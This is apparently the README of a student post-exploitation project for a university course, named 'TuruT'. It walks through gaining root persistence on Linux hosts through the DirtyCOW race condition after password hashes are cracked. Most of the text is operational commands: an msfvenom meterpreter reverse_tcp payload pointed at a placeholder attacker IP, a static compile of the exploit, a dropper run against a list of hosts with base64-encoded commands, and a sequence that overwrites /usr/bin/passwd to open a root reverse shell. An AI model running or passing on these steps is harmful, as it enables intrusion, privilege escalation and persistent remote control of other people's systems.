# TURUT

 This is the README file for the post exploitation project nicknamed "TuruT"
 The project is designed for the COSC481 Case Studies course

 The Project's goals are to plant persistence as the root user, after cracking
 a hash for a non-sudo user. This is done by taking advantage of CVE-2016-5195
 otherwise known as DirtyC0W

 This exploit takes advantage of a race condition within the Copy-on-Write mechanism
 of linux systems. Taking advantage of the mechanism allows us to write to a normally
 read-only file, which could lead to disastrous outcomes, such as those demonstrated
 by TuruT




To use TuruT:

 Crack a password hash of a user on the target systems/network or otherwise gain 
 access to an underprivileged user. 

 In our specific case, we have cracked password 
 hashes that apply to an entire subnetwork, and thus we can add a list of vulnerable 
 systems to the 'hosts' file included in this directory.

 Use the poke_suid_1.c file to implant your custom reversetcp shellcode:
> 	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Attacker-IP> LPORT=<Attacker-Port> -e x86/shikata_ga_nai -f elf | xxd -i > shellcode.txt

 After implanting shellcode into the poke_suid_1.c, compile with musl:
> 	musl-gcc -static -pthread -o amanita poke_suid_1.c

 Start a multi/handler listener with metasploit tied to the ip/port above

 Load into turut_dropper.py with :
> 	python turut_dropper.py -i hosts -u <user> -p <password> -l <local-path-of-dc-binary> -r <remote-destination-path/dc-binary> -c '<base64-command>' &

>	Note for <base64-command>: When running multiple commands after one another it is best to base64 them together with:
>	'echo <base64'd-code> | base64 -d | sh' 

>	For this example use:
>>		tar -xvf /home/user/fungus.tar		# unpack the goodies
>>		/home/zathras/fungus/amanita &		# execute dc binary to overwrite /usr/bin/passwd
>>		sleep 15;				# give it time to work a lil
>>		passwd &				# execute and wait for reverse shell

> There exists a post-exploitation-automation bash script in the package called config.sh. 
> This script should be ran as a full root account and not the suid root. For some reason the permissions won't carry.


> "Tis a MOXIE by PROXY my dear friend"
